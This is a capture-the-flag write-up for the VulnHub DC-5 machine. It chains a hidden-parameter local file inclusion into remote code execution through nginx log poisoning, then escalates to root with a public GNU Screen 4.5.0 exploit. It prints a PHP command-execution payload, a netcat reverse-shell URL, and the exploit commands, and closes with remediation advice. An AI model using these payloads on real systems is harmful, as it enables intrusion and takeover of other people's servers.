# DC-5 Write-up

> **Platform:** VulnHub, [DC-5](https://www.vulnhub.com/entry/dc-5,314/) **Machine:** DC-5 **Difficulty:** Intermediate **Operating System:** Debian Linux **Author:** Ctum

---
## Overview

DC-5 moves away from brute forcing and credential leaks and into web application logic instead. The entire compromise runs through a Local File Inclusion (LFI) vulnerability discovered by fuzzing a hidden parameter, escalated into remote code execution through log poisoning, and finished off with a SUID binary exploit against an unusually old version of GNU Screen. It is a good exercise in hidden parameter discovery and chaining LFI into a full shell.

---
## Attack Path

1. Enumerated open services with Nmap.
2. Enumerated web content with DirBuster.
3. Identified an interesting contact form and observed dynamic, unsanitized query string behavior.
4. Fuzzed for hidden backend parameters and discovered a `file` parameter.
5. Confirmed Local File Inclusion by reading `/etc/passwd`.
6. Fuzzed the `file` parameter further using an LFI-focused wordlist to map out readable paths.
7. Escalated LFI into remote code execution using nginx log poisoning.
8. Established a reverse shell.
9. Found an unusual SUID binary, GNU Screen 4.5.0.
10. Used a public exploit for GNU Screen to escalate to root.
11. Retrieved the final flag.

---

## Initial Enumeration

```bash
nmap -p- -sC -sV -T5 dc-5
```

```text
80/tcp    open  http    nginx 1.6.2
|_http-title: Welcome
111/tcp   open  rpcbind 2-4 (RPC #100000)
37584/tcp open  status  1 (RPC #100024)
```

Port 111 and its associated RPC status service were standard and not particularly interesting on their own. Port 80, running an older version of nginx, was the clear focus.

---
## Web Content Enumeration

Checking the page source and requesting `robots.txt` turned up nothing. A DirBuster scan found a handful of pages:

```text
/index.php
/contact.php
/faq.php
/solutions.php
/footer.php
/about-us.php
/thankyou.php
```

Walking through each page manually, the contact form stood out as the most promising target since it accepted user input and had somewhere to actually submit to.

---
## Investigating the Contact Form

Submitting the contact form sent a plain GET request, which I intercepted with Burp Suite. Two things stood out. First, the request parameters were not sanitized in any obvious way. Second, refreshing the resulting `thankyou.php` page changed the footer copyright text each time, suggesting the backend was dynamically pulling content from different files behind the scenes.

That behavior, combined with an unsanitized GET request, made `thankyou.php` worth fuzzing for hidden parameters.

---
## Discovering a Hidden Parameter

I used Wfuzz with a common backend parameter wordlist to look for anything the application accepted beyond what was visible in the form.

```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 851 "http://dc-5/thankyou.php?FUZZ=datadata"
```

The `--hh 851` flag filtered out the baseline response size for failed guesses, leaving only genuinely different responses. One parameter matched: **`file`**.

A parameter named `file` is a strong, suggestive name. It usually means the backend is passing that value into some kind of file read or include operation, which made it worth testing directly.

---
## Confirming Local File Inclusion

```text
http://dc-5/thankyou.php?file=/etc/passwd
```

The request returned the contents of `/etc/passwd`, confirming a Local File Inclusion vulnerability. I also confirmed the LFI could reach files inside the web root:

```text
http://dc-5/thankyou.php?file=/var/www/html/index.php
```

This rendered the source of `index.php` directly inside the `thankyou.php` response, confirming the parameter was including files rather than just displaying them as plain text in some cases.

---
## Mapping Out Readable Files

To understand the scope of the LFI, I fuzzed the `file` parameter against a dedicated LFI wordlist.

```bash
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 835 "http://dc-5/thankyou.php?file=FUZZ"
```

Before adding the `--hh` filter, I first ran the fuzz without it to see what an average "bad" response length looked like, then filtered that size out to get a clean result set. This turned up a large number of readable system files, including `/etc/passwd` (reachable through many different traversal patterns), `/etc/hosts`, `/etc/crontab`, `/etc/ssh/sshd_config`, various `/proc` files, and log files under `/var/log`. The wordlist used was not nginx-specific, so a more targeted list may have surfaced additional paths, but this was already more than enough to move forward.

---
## Escalating LFI to Remote Code Execution

With confirmed file read access, the next step was log poisoning: planting attacker-controlled PHP code inside a log file the server writes to on every request, then including that log file through the LFI to execute it.

I injected a PHP payload through the User-Agent (or directly via the request itself), targeting the nginx error log:

```text
http://dc-5/thankyou.php?file=<?php system($_GET['cmd']); ?>
```

Once the payload was written into `/var/log/nginx/error.log`, including that file through the LFI parameter would execute any PHP inside it, meaning the `cmd` parameter now behaved as a command execution endpoint.

I set up a listener locally:

```bash
nc -lvnp 4444
```

Then triggered a reverse shell by including the poisoned log file and passing a `cmd` value that connects back to the listener:

```text
http://dc-5/thankyou.php?file=/var/log/nginx/error.log&cmd=nc%20-e%20/bin/bash%20192.168.56.1%204444
```

The listener caught a connection, giving me a shell as `nobody`.

---
## Stabilizing the Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

As `nobody`, I had very limited permissions and needed to escalate.

---
## Finding the Privilege Escalation Path

```bash
find / -perm -u=s -type f 2>/dev/null
```

Among the usual SUID binaries, one entry stood out immediately: **GNU Screen 4.5.0**. Screen is a terminal multiplexer, and it is not a binary that normally appears with the SUID bit set, which made it an obvious candidate to research further.

```bash
searchsploit screen 4.5.0
```

This returned a known local privilege escalation script:

```text
GNU Screen 4.5.0 - Local Privilege Escalation | linux/local/41154.sh
```

---
## Exploiting GNU Screen

```bash
searchsploit -m linux/local/41154.sh
```

After copying the script locally, I transferred its contents to the target and recreated it inside `/var/tmp`, then made it executable and ran it:

```bash
chmod 755 41154.sh
./41154.sh
```

This dropped me into a root shell.

---
## Final Flag

```bash
cd /root
cat thisistheflag.txt
```

```text
Once again, a big thanks to all those who do these little challenges,
and especially all those who give me feedback, again, it's all greatly
appreciated. :-)

I also want to send a big thanks to all those who find the vulnerabilities
and create the exploits that make these challenges possible.
```

Machine complete.

---
## Flags Summary

|Flag|Location|How It Was Found|
|---|---|---|
|Final|`/root/thisistheflag.txt`|Retrieved after GNU Screen 4.5.0 SUID exploit|

DC-5 only contains a single flag, located in `/root` after full compromise.

---
## Remediation

- **Never pass user-controlled input directly into a file include or read function.** The `file` parameter here allowed arbitrary file inclusion with no validation or allowlisting of expected values.
- **Disable directory traversal at the application layer**, and validate any file-based parameter against a strict allowlist of expected filenames rather than trusting raw input.
- **Restrict read access to sensitive log files** from the web server process where possible, and avoid allowing user-controlled content to be written into logs that the application can also include or execute.
- **Regularly audit SUID binaries.** GNU Screen should never carry the SUID bit under normal circumstances; its presence here was the single clearest signal of a viable privilege escalation path.
- **Keep system utilities patched**, not just web-facing software. The GNU Screen vulnerability exploited here has been public and patched for a long time.
- **Restrict outbound connections from the web server** where feasible, since the reverse shell relied on unrestricted outbound access from the compromised process.

---
## Lessons Learned

- Hidden parameters are a real and common attack surface. Fuzzing with a general parameter wordlist against a page that already behaves suspiciously (dynamic footer content, unsanitized GET data) is often enough to surface them.
- A parameter name like `file` is a strong hint about intended backend behavior and is worth testing directly before doing broader fuzzing.
- Establishing a baseline for "normal" fuzzing response size before filtering (`--hh`) avoids accidentally filtering out real, useful results.
- LFI alone is often just the first half of an attack chain. Combined with log poisoning, it becomes full remote code execution.
- Not every SUID binary on a "normal" list is actually normal. A terminal multiplexer with the SUID bit set is a strong anomaly and worth investigating immediately.

---
## Tools Used

- Nmap
- DirBuster
- Burp Suite
- Wfuzz
- Netcat
- Searchsploit

---
## Technologies Encountered

- nginx
- PHP
- GNU Screen 4.5.0
- Debian Linux

---
## Skills Practiced

- Network Enumeration
- Web Content Discovery
- Hidden Parameter Fuzzing
- Local File Inclusion (LFI)
- Log Poisoning for Remote Code Execution
- Reverse Shell Handling
- SUID Binary Exploitation